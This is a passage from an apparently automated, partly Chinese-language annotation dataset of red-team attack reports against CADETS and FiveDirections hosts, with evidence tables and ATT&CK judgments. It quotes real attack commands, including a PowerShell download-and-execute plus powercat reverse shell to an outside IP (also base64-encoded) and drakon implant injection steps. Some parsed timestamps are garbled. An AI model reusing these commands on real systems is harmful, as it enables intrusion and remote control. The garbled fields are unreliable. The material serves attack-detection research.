- `ip_port` / `128.55.12.167:8043`  Evidence: `3_14_e024`  Raw: 128.55.12.167:8043
- `ip_port` / `53.158.101.118:80`  Evidence: `3_14_e025, 3_14_e038`  Raw: 53.158.101.118:80
- `ip_port` / `128.55.12.167:8044`  Evidence: `3_14_e025`  Raw: 128.55.12.167:8044
- `command` / `F1>putfile ./deploy/archive/drakon.freebsd.x64_53.158.101.118 pEja72mA`  Evidence: `3_14_e026`  Raw: putfile
- `command` / `F1>putfile ./deploy/archive/libdrakon.freebsd.x64.so_198.115.236.119 eWq10bVcx`  Evidence: `3_14_e027`  Raw: putfile
- `file_path` / `/tmp/pEja72mA`  Evidence: `3_14_e031`  Raw: /tmp/pEja72mA
- `command` / `F1>elevate /tmp/pEja72mA`  Evidence: `3_14_e031`  Raw: elevate
- `file_path` / `/tmp/memhelp.so`  Evidence: `3_14_e032`  Raw: /tmp/memhelp.so
- `command` / `F2>inject /tmp/memhelp.so 20691`  Evidence: `3_14_e032`  Raw: inject
- `command` / `F2>inject eraseme 20691`  Evidence: `3_14_e033`  Raw: inject
- `file_path` / `/tmp/done.so`  Evidence: `3_14_e034`  Raw: /tmp/done.so
- `command` / `F2>inject /tmp/done.so 20691`  Evidence: `3_14_e034`  Raw: inject
- `ip_port` / `78.205.235.65:80`  Evidence: `3_14_e036`  Raw: 78.205.235.65:80

#### 原始子节摘录

- `3.14.lead` Section Lead (lines 1104-1111)

  > Finished attack against CADETS FreeBSD by trying to inject into sshd one last time, which failed.
  > Connected to a left open connection from the previous attack then disconnected it. Re-exploited Nginx
  > with an HTTP request, once again resulting in a new drakon implant running in Nginx memory. The
  > drakon implant connected out to the operator console for C2. The attacker downloaded the drakon
  > implant executable and library to disk. The drakon implant executable was ran from disk, resulting in a
  > new drakon process with root privileges and a new connection to the operator console. The attacker
  > then used the root drakon implant to try to inject into sshd once again but failed.

- `3.14.1` Comments (lines 1113-1121)

  > We tried one last time to get injection to work on CADETS. Our working theory was that there was some
  > conflict with our elevate code and CADETS, so we built a version of the process injection module which
  > would not perform a privilege escalation. This would need to be done before trying to inject the drakon
  > implant into the target process. The new module did not work, and injection failed multiple times
  > without the CADETS host crashing. Eventually, the sshd process became unresponsive and needed to be
  > restarted.

- `3.14.2` Event Log (lines 1122-1142)

  > - 09:04 reconnect to open connection
  > - 09:04 whoami
  > - 09:06 quit
  > - 09:07 http post nc -s 25.159.96.207 128.55.12.73 80
  > - 09:07 shell F1
  > - 09:10 putfile ./deploy/archive/drakon.freebsd.x64_53.158.101.118 pEja72mA
  > - 09:11 putfile ./deploy/archive/libdrakon.freebsd.x64.so_198.115.236.119 eWq10bVcx
  > - 09:12 elevate pEja72mA
  > - 09:12 connection F2
  > - 09:12 console F2
  > - 09:12 whoami
  > - 09:13 ps
  > - * root 20691 0.0 0.0 17948 6088 - Ss 18:34             0:00.41 /usr/sbin/sshd
  > - 09:14 ps
  > - 09:15 inject
  > - inject
  > - inject
  > - crash

- `3.14.3` Addresses (lines 1143-1150)

  > - [eth0:920] 25.159.96.207:80 -> 128.55.12.167:8040   webserver
  > - [eth0:921] 76.56.184.25:80 -> 128.55.12.167:8041   shellcode_server
  > - [eth0:922] 155.162.39.48:80 -> 128.55.12.167:8042   loaderDrakon.freebsd.x64
  > - [eth0:923] 198.115.236.119:80 -> 128.55.12.167:8043 libdrakon.freebsd.x64
  > - [eth0:924] 53.158.101.118:80 -> 128.55.12.167:8044 drakon.freebsd.x64

- `3.14.4.1` Files (lines 1153-1159)

  > - F1>putfile ./deploy/archive/drakon.freebsd.x64_53.158.101.118 pEja72mA
  > - F1>putfile ./deploy/archive/libdrakon.freebsd.x64.so_198.115.236.119 eWq10bVcx
  > - F2>cp eWq10bVcx memhelp.so
  > - F2>cp memhelp.so eraseme
  > - F2>cp eraseme done.so

- `3.14.4.2` Processes (lines 1160-1164)

  > - F1>elevate /tmp/pEja72mA
  > - F2>inject /tmp/memhelp.so 20691
  > - F2>inject eraseme 20691
  > - F2>inject /tmp/done.so 20691

- `3.14.4.3` Connections (lines 1165-1171)

  > - exploit: connection on port 80 from 25.159.96.207
  > - nginx: connection to 78.205.235.65:80
  > - nginx: connection to 155.162.39.48:80
  > - pEja72mA: connection to 53.158.101.118:80
  > - sshd: connection to 198.115.236.119:80

- `3.14.5` Graph (lines 1172-1175)
#### 证据条目

1. `3_14_e001` | `narrative_comment` | `3.14.lead Section Lead` | lines `1104-1111`
   - Raw: Finished attack against CADETS FreeBSD by trying to inject into sshd one last time, which failed. Connected to a left open connection from the previous attack then disconnected it. Re-exploited Nginx with an HTTP request, once again resulting in a new drakon implant running in Nginx memory. The drakon implant connected out to the operator console for C2. The attacker downloaded the drakon implant executable and library to disk. The drakon implant executable was ran from disk, resulting in a new drakon process with root privileges and a new connection to the operator console. The attacker then used the root drakon implant to try to inject into sshd once again but failed.
   - Time: `-` / `-`
   - Observables: process_name=nginx; process_name=sshd; process_name=drakon; command=Finished attack against CADETS FreeBSD by trying to inject into sshd one last time, which failed. Connected to a left open connection from the previous attack then disconnected it. Re-exploited Nginx with an HTTP request, once again resulting in a new drakon implant running in Nginx memory. The drakon implant connected out to the operator console for C2. The attacker downloaded the drakon implant executable and library to disk. The drakon implant executable was ran from disk, resulting in a new drakon process with root privileges and a new connection to the operator console. The attacker then used the root drakon implant to try to inject into sshd once again but failed.; host=CADETS
1. `3_14_e002` | `narrative_comment` | `3.14.1 Comments` | lines `1115-1120`
   - Raw: We tried one last time to get injection to work on CADETS. Our working theory was that there was some conflict with our elevate code and CADETS, so we built a version of the process injection module which would not perform a privilege escalation. This would need to be done before trying to inject the drakon implant into the target process. The new module did not work, and injection failed multiple times without the CADETS host crashing. Eventually, the sshd process became unresponsive and needed to be restarted.
   - Time: `-` / `-`
   - Observables: process_name=sshd; process_name=drakon; command=We tried one last time to get injection to work on CADETS. Our working theory was that there was some conflict with our elevate code and CADETS, so we built a version of the process injection module which would not perform a privilege escalation. This would need to be done before trying to inject the drakon implant into the target process. The new module did not work, and injection failed multiple times without the CADETS host crashing. Eventually, the sshd process became unresponsive and needed to be restarted.; host=CADETS
1. `3_14_e003` | `event_log` | `3.14.2 Event Log` | lines `1124-1124`
   - Raw: 09:04 reconnect to open connection
   - Time: `09:04` / `2018-04-13T09:04:00`
   - Observables: -
1. `3_14_e004` | `event_log` | `3.14.2 Event Log` | lines `1125-1125`
   - Raw: 09:04 whoami
   - Time: `09:04` / `2018-04-13T09:04:00`
   - Observables: command=09:04 whoami
1. `3_14_e005` | `event_log` | `3.14.2 Event Log` | lines `1126-1126`
   - Raw: 09:06 quit
   - Time: `09:06` / `2018-04-13T09:06:00`
   - Observables: -
1. `3_14_e006` | `event_log` | `3.14.2 Event Log` | lines `1127-1127`
   - Raw: 09:07 http post nc -s 25.159.96.207 128.55.12.73 80
   - Time: `09:07` / `2018-04-13T09:07:00`
   - Observables: -
1. `3_14_e007` | `event_log` | `3.14.2 Event Log` | lines `1128-1128`
   - Raw: 09:07 shell F1
   - Time: `09:07` / `2018-04-13T09:07:00`
   - Observables: -
1. `3_14_e008` | `event_log` | `3.14.2 Event Log` | lines `1129-1129`
   - Raw: 09:10 putfile ./deploy/archive/drakon.freebsd.x64_53.158.101.118 pEja72mA
   - Time: `09:10` / `2018-04-13T09:10:00`
   - Observables: file_path=/deploy/archive/drakon.freebsd.x64_53.158.101.118; domain=drakon.freebsd; process_name=drakon; command=09:10 putfile ./deploy/archive/drakon.freebsd.x64_53.158.101.118 pEja72mA
1. `3_14_e009` | `event_log` | `3.14.2 Event Log` | lines `1130-1130`
   - Raw: 09:11 putfile ./deploy/archive/libdrakon.freebsd.x64.so_198.115.236.119 eWq10bVcx
   - Time: `09:11` / `2018-04-13T09:11:00`
   - Observables: file_path=/deploy/archive/libdrakon.freebsd.x64.so_198.115.236.119; domain=libdrakon.freebsd; process_name=drakon; command=09:11 putfile ./deploy/archive/libdrakon.freebsd.x64.so_198.115.236.119 eWq10bVcx
1. `3_14_e010` | `event_log` | `3.14.2 Event Log` | lines `1131-1131`
   - Raw: 09:12 elevate pEja72mA
   - Time: `09:12` / `2018-04-13T09:12:00`
   - Observables: command=09:12 elevate pEja72mA
1. `3_14_e011` | `event_log` | `3.14.2 Event Log` | lines `1132-1132`
   - Raw: 09:12 connection F2
   - Time: `09:12` / `2018-04-13T09:12:00`
   - Observables: -
1. `3_14_e012` | `event_log` | `3.14.2 Event Log` | lines `1133-1133`
   - Raw: 09:12 console F2
   - Time: `09:12` / `2018-04-13T09:12:00`
   - Observables: -
1. `3_14_e013` | `event_log` | `3.14.2 Event Log` | lines `1134-1134`
   - Raw: 09:12 whoami
   - Time: `09:12` / `2018-04-13T09:12:00`
   - Observables: command=09:12 whoami
1. `3_14_e014` | `event_log` | `3.14.2 Event Log` | lines `1135-1135`
   - Raw: 09:13 ps
   - Time: `09:13` / `2018-04-13T09:13:00`
   - Observables: command=09:13 ps
1. `3_14_e015` | `event_log` | `3.14.2 Event Log` | lines `1136-1136`
   - Raw: * root 20691 0.0 0.0 17948 6088 - Ss 18:34             0:00.41 /usr/sbin/sshd
   - Time: `18:34` / `2018-04-13T18:34:00`
   - Observables: file_path=/usr/sbin/sshd; pid=20691; process_name=sshd
1. `3_14_e016` | `event_log` | `3.14.2 Event Log` | lines `1137-1137`
   - Raw: 09:14 ps
   - Time: `09:14` / `2018-04-13T09:14:00`
   - Observables: command=09:14 ps
1. `3_14_e017` | `event_log` | `3.14.2 Event Log` | lines `1138-1138`
   - Raw: 09:15 inject
   - Time: `09:15` / `2018-04-13T09:15:00`
   - Observables: command=09:15 inject
1. `3_14_e018` | `event_log` | `3.14.2 Event Log` | lines `1139-1139`
   - Raw: inject
   - Time: `-` / `-`
   - Observables: command=inject
1. `3_14_e019` | `event_log` | `3.14.2 Event Log` | lines `1140-1140`
   - Raw: inject
   - Time: `-` / `-`
   - Observables: command=inject
1. `3_14_e020` | `event_log` | `3.14.2 Event Log` | lines `1141-1141`
   - Raw: crash
   - Time: `-` / `-`
   - Observables: -
1. `3_14_e021` | `address` | `3.14.3 Addresses` | lines `1145-1145`
   - Raw: [eth0:920] 25.159.96.207:80 -> 128.55.12.167:8040   webserver
   - Time: `55.12` / `2018-04-13T55:12:00`
   - Observables: ip_port=25.159.96.207:80; ip_port=128.55.12.167:8040
1. `3_14_e022` | `address` | `3.14.3 Addresses` | lines `1146-1146`
   - Raw: [eth0:921] 76.56.184.25:80 -> 128.55.12.167:8041   shellcode_server
   - Time: `76.56` / `2018-04-13T76:56:00`
   - Observables: ip_port=76.56.184.25:80; ip_port=128.55.12.167:8041
1. `3_14_e023` | `address` | `3.14.3 Addresses` | lines `1147-1147`
   - Raw: [eth0:922] 155.162.39.48:80 -> 128.55.12.167:8042   loaderDrakon.freebsd.x64
   - Time: `39.48` / `2018-04-13T39:48:00`
   - Observables: ip_port=155.162.39.48:80; ip_port=128.55.12.167:8042; domain=loaderDrakon.freebsd; process_name=drakon; process_name=loaderdrakon
1. `3_14_e024` | `address` | `3.14.3 Addresses` | lines `1148-1148`
   - Raw: [eth0:923] 198.115.236.119:80 -> 128.55.12.167:8043 libdrakon.freebsd.x64
   - Time: `55.12` / `2018-04-13T55:12:00`
   - Observables: ip_port=198.115.236.119:80; ip_port=128.55.12.167:8043; domain=libdrakon.freebsd; process_name=drakon
1. `3_14_e025` | `address` | `3.14.3 Addresses` | lines `1149-1149`
   - Raw: [eth0:924] 53.158.101.118:80 -> 128.55.12.167:8044 drakon.freebsd.x64
   - Time: `55.12` / `2018-04-13T55:12:00`
   - Observables: ip_port=53.158.101.118:80; ip_port=128.55.12.167:8044; domain=drakon.freebsd; process_name=drakon
1. `3_14_e026` | `interaction_file` | `3.14.4.1 Files` | lines `1154-1154`
   - Raw: F1>putfile ./deploy/archive/drakon.freebsd.x64_53.158.101.118 pEja72mA
   - Time: `-` / `-`
   - Observables: file_path=/deploy/archive/drakon.freebsd.x64_53.158.101.118; domain=drakon.freebsd; process_name=drakon; command=F1>putfile ./deploy/archive/drakon.freebsd.x64_53.158.101.118 pEja72mA
1. `3_14_e027` | `interaction_file` | `3.14.4.1 Files` | lines `1155-1155`
   - Raw: F1>putfile ./deploy/archive/libdrakon.freebsd.x64.so_198.115.236.119 eWq10bVcx
   - Time: `-` / `-`
   - Observables: file_path=/deploy/archive/libdrakon.freebsd.x64.so_198.115.236.119; domain=libdrakon.freebsd; process_name=drakon; command=F1>putfile ./deploy/archive/libdrakon.freebsd.x64.so_198.115.236.119 eWq10bVcx
1. `3_14_e028` | `interaction_file` | `3.14.4.1 Files` | lines `1157-1157`
   - Raw: F2>cp eWq10bVcx memhelp.so
   - Time: `-` / `-`
   - Observables: -
1. `3_14_e029` | `interaction_file` | `3.14.4.1 Files` | lines `1158-1158`
   - Raw: F2>cp memhelp.so eraseme
   - Time: `-` / `-`
   - Observables: -
1. `3_14_e030` | `interaction_file` | `3.14.4.1 Files` | lines `1159-1159`
   - Raw: F2>cp eraseme done.so
   - Time: `-` / `-`
   - Observables: -
1. `3_14_e031` | `interaction_process` | `3.14.4.2 Processes` | lines `1161-1161`
   - Raw: F1>elevate /tmp/pEja72mA
   - Time: `-` / `-`
   - Observables: file_path=/tmp/pEja72mA; command=F1>elevate /tmp/pEja72mA
1. `3_14_e032` | `interaction_process` | `3.14.4.2 Processes` | lines `1162-1162`
   - Raw: F2>inject /tmp/memhelp.so 20691
   - Time: `-` / `-`
   - Observables: file_path=/tmp/memhelp.so; command=F2>inject /tmp/memhelp.so 20691
1. `3_14_e033` | `interaction_process` | `3.14.4.2 Processes` | lines `1163-1163`
   - Raw: F2>inject eraseme 20691
   - Time: `-` / `-`
   - Observables: command=F2>inject eraseme 20691
1. `3_14_e034` | `interaction_process` | `3.14.4.2 Processes` | lines `1164-1164`
   - Raw: F2>inject /tmp/done.so 20691
   - Time: `-` / `-`
   - Observables: file_path=/tmp/done.so; command=F2>inject /tmp/done.so 20691
1. `3_14_e035` | `interaction_connection` | `3.14.4.3 Connections` | lines `1166-1166`
   - Raw: exploit: connection on port 80 from 25.159.96.207
   - Time: `-` / `-`
   - Observables: -
1. `3_14_e036` | `interaction_connection` | `3.14.4.3 Connections` | lines `1167-1167`
   - Raw: nginx: connection to 78.205.235.65:80
   - Time: `65:80` / `2018-04-13T65:80:00`
   - Observables: ip_port=78.205.235.65:80; process_name=nginx
1. `3_14_e037` | `interaction_connection` | `3.14.4.3 Connections` | lines `1168-1168`
   - Raw: nginx: connection to 155.162.39.48:80
   - Time: `39.48` / `2018-04-13T39:48:00`
   - Observables: ip_port=155.162.39.48:80; process_name=nginx
1. `3_14_e038` | `interaction_connection` | `3.14.4.3 Connections` | lines `1169-1169`
   - Raw: pEja72mA: connection to 53.158.101.118:80
   - Time: `-` / `-`
   - Observables: ip_port=53.158.101.118:80
1. `3_14_e039` | `interaction_connection` | `3.14.4.3 Connections` | lines `1170-1170`
   - Raw: sshd: connection to 198.115.236.119:80
   - Time: `-` / `-`
   - Observables: ip_port=198.115.236.119:80; process_name=sshd


## FIVEDIRECTIONS

### FIVEDIRECTIONS_20180409_1319_1542_01 / Section 4.4

- 标题：`20180409 1500 FiveDirections – Phishing E-mail w/ Excel Macro`
- 状态：`confirmed`
- 时间精度：`minute_window`
- 时间窗：`2018-04-09T13:19:00` -> `2018-04-09T15:42:00`
- Markdown 行号：`1412-1499`
- 报告页：`34, 35`
- 攻击概述：FiveDirections 上的 Excel 宏钓鱼最终通过手工执行 PowerShell 成功：下载并执行 update.ps1，建立远程 shell，随后读取 hosts 与多份本地文档，并删除恶意表格附件。
- 备注：自动宏执行失败被保留在证据中，但窗口总体是 confirmed，因为手工 PowerShell 执行后攻击链成功建立。

#### 战术判定

| Tactic | Judgment | 含义 | Why | Evidence IDs |
| --- | --- | --- | --- | --- |
| INITIAL_ACCESS | confirmed | 初始进入 | 钓鱼邮件附件把攻击入口送达了目标用户。 | 4_4_e001, 4_4_e003, 4_4_e006 |
| EXECUTION | confirmed | 执行 | PowerShell 编码命令与 update.ps1 被手工执行。 | 4_4_e001, 4_4_e011 |
| COMMAND_AND_CONTROL | confirmed | 命令控制 | PowerShell/update.ps1 建立了回连 shell。 | 4_4_e001, 4_4_e011, 4_4_e023 |
| DISCOVERY | confirmed | 侦察发现 | hosts 文件被读取，用于环境侦察。 | 4_4_e015, 4_4_e018, 4_4_e019, 4_4_e020 |
| COLLECTION | confirmed | 数据收集 | 多个本地文档被显式读取。 | 4_4_e015, 4_4_e018, 4_4_e019, 4_4_e020 |
| DEFENSE_EVASION | confirmed | 防御规避 | 恶意附件 BoviaBenefitsOE.xlsm 被删除。 | 4_4_e021 |

#### Technique 判定

| Technique | Judgment | Why | Evidence IDs |
| --- | --- | --- | --- |
| T1566.001 | confirmed | 报告明确写到钓鱼邮件携带恶意 Excel 附件。 | 4_4_e001, 4_4_e003, 4_4_e006 |
| T1204.002 | confirmed | 用户侧实际执行了恶意文件/命令链。 | 4_4_e001, 4_4_e003, 4_4_e006, 4_4_e011 |
| T1059.001 | confirmed | PowerShell 命令被直接执行。 | 4_4_e001, 4_4_e011 |
| T1005 | confirmed | 本地 hosts 和多份文档被直接读取。 | 4_4_e015, 4_4_e018, 4_4_e019, 4_4_e020 |
| T1070.004 | confirmed | 恶意表格附件被删除。 | 4_4_e021 |

#### Behavior Chain

| Behavior ID | Action | Judgment | Why | Evidence IDs |
| --- | --- | --- | --- | --- |
| phishing_attachment | attachment_delivery | confirmed | 报告明确写到发送了带编码 PowerShell 宏的 Excel 附件。 | 4_4_e001, 4_4_e003, 4_4_e006 |
| powershell_execute | payload_execute | confirmed | Event Log 明确写到手工运行 powershell -encodedCommand 并收到连接。 | 4_4_e001, 4_4_e011 |
| c2_callback | c2_callback | confirmed | 正文写到 resulting in a new connection out for a remote command shell。 | 4_4_e001, 4_4_e011, 4_4_e023 |
| file_collect | file_read | confirmed | Interactions 明确列出 hosts 与多份 rtf 文档读取。 | 4_4_e015, 4_4_e018, 4_4_e019, 4_4_e020 |
| cleanup_delete | file_delete | confirmed | 恶意表格附件被显式删除。 | 4_4_e021 |

#### 显式观测

- `file_path` / `C:\Users\user`  Evidence: `4_4_e001`  Raw: C:\Users\user
- `file_path` / `C:\programdata\`  Evidence: `4_4_e001`  Raw: C:\programdata\
- `file_path` / `C:\\programdata\\update.ps1;`  Evidence: `4_4_e001`  Raw: C:\\programdata\\update.ps1;
- `file_path` / `/208.75.117.5/update.ps1`  Evidence: `4_4_e001`  Raw: /208.75.117.5/update.ps1
- `domain` / `Net.WebClient`  Evidence: `4_4_e001`  Raw: Net.WebClient
- `domain` / `cmd.exe`  Evidence: `4_4_e001`  Raw: cmd.exe
- `domain` / `Text.Encoding`  Evidence: `4_4_e001`  Raw: Text.Encoding
- `domain` / `Unicode.GetBytes`  Evidence: `4_4_e001`  Raw: Unicode.GetBytes
- `process_name` / `powershell`  Evidence: `4_4_e001, 4_4_e002, 4_4_e011`  Raw: powershell
- `command` / `Common Threat attacked FiveDirections using e-mail phishing and Excel spreadsheet macro with powershell. The attacker used information gathered from the Bob user's e-mail account to send phishing e-mails to other employees. The e-mail included a spreadsheet attachment with an encoded powershell command. The powershell command downloaded a powershell script and executed it, resulting in a new connection out for a remote command shell. The command was not executed as expected. The user saw the command in the macro and ran it manually from a command shell. The attacker now had a shell to the machine. The attacker ran many commands to survey the target, including reading the hosts file and several personal files. PS C:\Users\user> $command = {(New-Object Net.WebClient).downloadfile('http://208.75.117.5/update.ps1', 'C:\programdata\ update.ps1'); . C:\\programdata\\update.ps1; powercat -c 208.75.117.6 -p 80 - e cmd.exe} PS C:\Users\user> $bytes = [Text.Encoding]::Unicode.GetBytes($command) PS C:\Users\user> $encCmd = [Convert]::ToBase64String($bytes) PS C:\Users\user> $encCmd KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvA HcAbgBsAG8AYQBkAGYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADgALgA3ADUALgAxADEANw AuADUALwB1AHAAZABhAHQAZQAuAHAAcwAxACcALAAgACcAQwA6AFwAcAByAG8AZwByAGEAbQBkAGE AdABhAFwAdQBwAGQAYQB0AGUALgBwAHMAMQAnACkAOwAgAC4AIABDADoAXABcAHAAcgBvAGcAcgBh AG0AZABhAHQAYQBcAFwAdQBwAGQAYQB0AGUALgBwAHMAMQA7ACAAcABvAHcAZQByAGMAYQB0ACAAL QBjACAAMgAwADgALgA3ADUALgAxADEANwAuADYAIAAtAHAAIAA4ADAAIAAtAGUAIABjAG0AZAAuAG UAeABlAA==`  Evidence: `4_4_e001`  Raw: powershell
- `host` / `FIVEDIRECTIONS`  Evidence: `4_4_e001, 4_4_e002`  Raw: FiveDirections
- `email_artifact` / `update.ps1`  Evidence: `4_4_e001, 4_4_e014, 4_4_e023`  Raw: update.ps1
- `command` / `The attack failed to work as originally intended. Even with macros enabled, for some reason the powershell command did not execute automatically when the spreadsheet was opened. As this was tested successfully on Windows 10 previously, there must have been some conflict or overlooked setting with the FiveDirections host. We noticed during the test that the operating system's path environment variable was broken so that no commands could be run from command line. This included utilities like ping, ftp, etc. We fixed the broken path, but still, the powershell command did not execute from Excel. Finally, we copied the encoded string into a command shell and ran it manually. We instantly got a shell and then had access. This wasn't an issue on the TA5.2 Windows host, which successfully launch the powershell script from the Excel macro on the first try.`  Evidence: `4_4_e002`  Raw: powershell
- `email_artifact` / `BoviaBenefitsOE.xlsm`  Evidence: `4_4_e003, 4_4_e013, 4_4_e021`  Raw: BoviaBenefitsOE.xlsm
- `command` / `python -m SimpleHTTPServer 2525 (208.75.117.5 80)`  Evidence: `4_4_e004`  Raw: ps
- `command` / `nc -l 2526`  Evidence: `4_4_e005`  Raw: nc -l
- `command` / `15:07 Manually ran powershell command and got connection back, ran this: powershell -nop -ep bypass -encodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvA HcAbgBsAG8AYQBkAGYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADgALgA3ADUALgAxADEANw AuADUALwB1AHAAZABhAHQAZQAuAHAAcwAxACcALAAgACcAQwA6AFwAcAByAG8AZwByAGEAbQBkAGE AdABhAFwAdQBwAGQAYQB0AGUALgBwAHMAMQAnACkAOwAgAC4AIABDADoAXABcAHAAcgBvAGcAcgBh AG0AZABhAHQAYQBcAFwAdQBwAGQAYQB0AGUALgBwAHMAMQA7ACAAcABvAHcAZQByAGMAYQB0ACAAL QBjACAAMgAwADgALgA3ADUALgAxADEANwAuADYAIAAtAHAAIAA4ADAAIAAtAGUAIABjAG0AZAAuAG UAeABlAA==`  Evidence: `4_4_e011`  Raw: powershell
- `command` / `update.ps1`  Evidence: `4_4_e014`  Raw: ps
- `file_path` / `C:\Users\admin`  Evidence: `4_4_e015`  Raw: C:\Users\admin
- `file_path` / `C:\windows\system32\drivers\etc\hosts`  Evidence: `4_4_e015`  Raw: C:\windows\system32\drivers\etc\hosts
- `file_path` / `C:\Users\admin\Documents`  Evidence: `4_4_e016, 4_4_e017, 4_4_e018, 4_4_e019, 4_4_e020`  Raw: C:\Users\admin\Documents
- `file_path` / `C:\Users\admin\Desktop`  Evidence: `4_4_e021, 4_4_e022`  Raw: C:\Users\admin\Desktop
- `pid` / `8744`  Evidence: `4_4_e022`  Raw: 8744
- `command` / `C:\Users\admin\Desktop>taskkill /PID 8744 /F`  Evidence: `4_4_e022`  Raw: taskkill
- `command` / `Connect out to 208.75.117.5 to download update.ps1`  Evidence: `4_4_e023`  Raw: ps

#### 原始子节摘录

- `4.4.lead` Section Lead (lines 1414-1438)

  > Common Threat attacked FiveDirections using e-mail phishing and Excel spreadsheet macro with
  > powershell. The attacker used information gathered from the Bob user's e-mail account to send
  > phishing e-mails to other employees. The e-mail included a spreadsheet attachment with an encoded
  > powershell command. The powershell command downloaded a powershell script and executed it,
  > resulting in a new connection out for a remote command shell. The command was not executed as
  > expected. The user saw the command in the macro and ran it manually from a command shell. The
  > attacker now had a shell to the machine. The attacker ran many commands to survey the target,
  > including reading the hosts file and several personal files.
  > PS C:\Users\user> $command = {(New-Object
  > Net.WebClient).downloadfile('http://208.75.117.5/update.ps1',
  > 'C:\programdata\
  > update.ps1'); . C:\\programdata\\update.ps1; powercat -c 208.75.117.6 -p 80 -
  > e cmd.exe}
  > PS C:\Users\user> $bytes = [Text.Encoding]::Unicode.GetBytes($command)
  > PS C:\Users\user> $encCmd = [Convert]::ToBase64String($bytes)
  > PS C:\Users\user> $encCmd
  > KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvA
  > HcAbgBsAG8AYQBkAGYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADgALgA3ADUALgAxADEANw
  > AuADUALwB1AHAAZABhAHQAZQAuAHAAcwAxACcALAAgACcAQwA6AFwAcAByAG8AZwByAGEAbQBkAGE
  > AdABhAFwAdQBwAGQAYQB0AGUALgBwAHMAMQAnACkAOwAgAC4AIABDADoAXABcAHAAcgBvAGcAcgBh
  > AG0AZABhAHQAYQBcAFwAdQBwAGQAYQB0AGUALgBwAHMAMQA7ACAAcABvAHcAZQByAGMAYQB0ACAAL
  > QBjACAAMgAwADgALgA3ADUALgAxADEANwAuADYAIAAtAHAAIAA4ADAAIAAtAGUAIABjAG0AZAAuAG
  > UAeABlAA==

- `4.4.1` Comments (lines 1440-1451)

  > The attack failed to work as originally intended. Even with macros enabled, for some reason the
  > powershell command did not execute automatically when the spreadsheet was opened. As this was
  > tested successfully on Windows 10 previously, there must have been some conflict or overlooked setting
  > with the FiveDirections host. We noticed during the test that the operating system's path environment
  > variable was broken so that no commands could be run from command line. This included utilities like
  > ping, ftp, etc. We fixed the broken path, but still, the powershell command did not execute from Excel.
  > Finally, we copied the encoded string into a command shell and ran it manually. We instantly got a shell
  > and then had access. This wasn't an issue on the TA5.2 Windows host, which successfully launch the
  > powershell script from the Excel macro on the first try.

- `4.4.2` Event Log (lines 1452-1473)

  > - Prepared BoviaBenefitsOE.xlsm attachment with IP and port connect back
  > - python -m SimpleHTTPServer 2525 (208.75.117.5 80)
  > - nc -l 2526
  > - 13:19 Send e-mail from Bob to Charles (68.
  > - 13:38 Failed to load e-mail client on FAROS
  > - 13:38 TA52-1 windows is inaccessible, is it down?
  > - 13:49 5D is missing ping, ftp
  > - 14:49 Opened spreadsheet again, connect out did not occur
  > - 15:07 Manually ran powershell command and got connection back, ran this:
  > powershell -nop -ep bypass -encodedCommand
  > KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvA
  > HcAbgBsAG8AYQBkAGYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADgALgA3ADUALgAxADEANw
  > AuADUALwB1AHAAZABhAHQAZQAuAHAAcwAxACcALAAgACcAQwA6AFwAcAByAG8AZwByAGEAbQBkAGE
  > AdABhAFwAdQBwAGQAYQB0AGUALgBwAHMAMQAnACkAOwAgAC4AIABDADoAXABcAHAAcgBvAGcAcgBh
  > AG0AZABhAHQAYQBcAFwAdQBwAGQAYQB0AGUALgBwAHMAMQA7ACAAcABvAHcAZQByAGMAYQB0ACAAL
  > QBjACAAMgAwADgALgA3ADUALgAxADEANwAuADYAIAAtAHAAIAA4ADAAIAAtAGUAIABjAG0AZAAuAG
  > UAeABlAA==
  > - 15:42 Exit

- `4.4.3` Interactions (lines 1474-1475)
- `4.4.3.1` Files (lines 1476-1487)

  > - BoviaBenefitsOE.xlsm
  > - update.ps1
  > - C:\Users\admin>type C:\windows\system32\drivers\etc\hosts
  > - C:\Users\admin\Documents>mkdir mydocs
  > - C:\Users\admin\Documents>rmdir mydocs
  > - C:\Users\admin\Documents>type Document.rtf
  > - C:\Users\admin\Documents>type MissleAlert.rtf
  > - C:\Users\admin\Documents>type trains.rtf
  > - C:\Users\admin\Desktop>del BoviaBenefitsOE.xlsm

- `4.4.3.2` Processes (lines 1488-1491)

  > - C:\Users\admin\Desktop>taskkill /PID 8744 /F

- `4.4.3.3` Connections (lines 1492-1495)

  > - Connect out to 208.75.117.5 to download update.ps1

- `4.4.4` Graph (lines 1496-1499)
#### 证据条目

1. `4_4_e001` | `narrative_comment` | `4.4.lead Section Lead` | lines `1414-1438`
   - Raw: Common Threat attacked FiveDirections using e-mail phishing and Excel spreadsheet macro with powershell. The attacker used information gathered from the Bob user's e-mail account to send phishing e-mails to other employees. The e-mail included a spreadsheet attachment with an encoded powershell command. The powershell command downloaded a powershell script and executed it, resulting in a new connection out for a remote command shell. The command was not executed as expected. The user saw the command in the macro and ran it manually from a command shell. The attacker now had a shell to the machine. The attacker ran many commands to survey the target, including reading the hosts file and several personal files. PS C:\Users\user> $command = {(New-Object Net.WebClient).downloadfile('http://208.75.117.5/update.ps1', 'C:\programdata\ update.ps1'); . C:\\programdata\\update.ps1; powercat -c 208.75.117.6 -p 80 - e cmd.exe} PS C:\Users\user> $bytes = [Text.Encoding]::Unicode.GetBytes($command) PS C:\Users\user> $encCmd = [Convert]::ToBase64String($bytes) PS C:\Users\user> $encCmd KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvA HcAbgBsAG8AYQBkAGYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADgALgA3ADUALgAxADEANw AuADUALwB1AHAAZABhAHQAZQAuAHAAcwAxACcALAAgACcAQwA6AFwAcAByAG8AZwByAGEAbQBkAGE 